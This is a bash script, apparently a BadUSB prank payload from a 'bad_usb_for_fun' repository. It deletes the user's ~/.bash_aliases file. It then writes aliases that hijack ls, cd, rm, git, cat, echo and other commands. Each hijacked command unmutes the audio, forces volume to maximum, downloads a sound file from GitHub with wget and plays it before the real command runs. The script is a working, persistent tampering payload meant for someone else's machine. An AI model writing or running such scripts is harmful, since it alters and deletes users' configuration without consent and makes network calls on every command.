#!/usr/bin/env bash

rm ~/.bash_aliases

# Add alias to .bash_aliases
echo "alias ls='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/yay.wav | aplay -q &) ; ls'" >> ~/.bash_aliases
echo "alias clear='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/fart.wav | aplay -q &) ; clear'" >> ~/.bash_aliases
echo "alias cd='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/spring.wav | aplay -q &) ; cd'" >> ~/.bash_aliases
echo "alias rm='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/creeper.wav | aplay -q &) ; rm'" >> ~/.bash_aliases
echo "alias mkdir='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/mail.wav | aplay -q &) ; mkdir'" >> ~/.bash_aliases
echo "alias mv='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/pipe.wav | aplay -q &) ; mv'" >> ~/.bash_aliases
echo "alias emacs='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/yamete.wav | aplay -q &) ; emacs'" >> ~/.bash_aliases
echo "alias gcc='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/my-code-is-broken.wav | aplay -q &) ; gcc'" >> ~/.bash_aliases
echo "alias man='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/book.wav | aplay -q &) ; man'" >> ~/.bash_aliases
echo "alias cp='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/amogus.wav | aplay -q &) ; cp'" >> ~/.bash_aliases
echo "alias valgrind='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/skill.wav | aplay -q &) ; valgrind'" >> ~/.bash_aliases
echo "alias make='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/nanomachines.wav | aplay -q &) ; make'" >> ~/.bash_aliases
echo "alias git='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/git_gud.wav | aplay -q &) ; git'" >> ~/.bash_aliases
echo "alias get='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/get_here.wav | aplay -q &) ; get'" >> ~/.bash_aliases
echo "alias cat='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/cat.wav | aplay -q &) ; cat'" >> ~/.bash_aliases
echo "alias echo='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/echo.wav | aplay -q &) ; echo'" >> ~/.bash_aliases
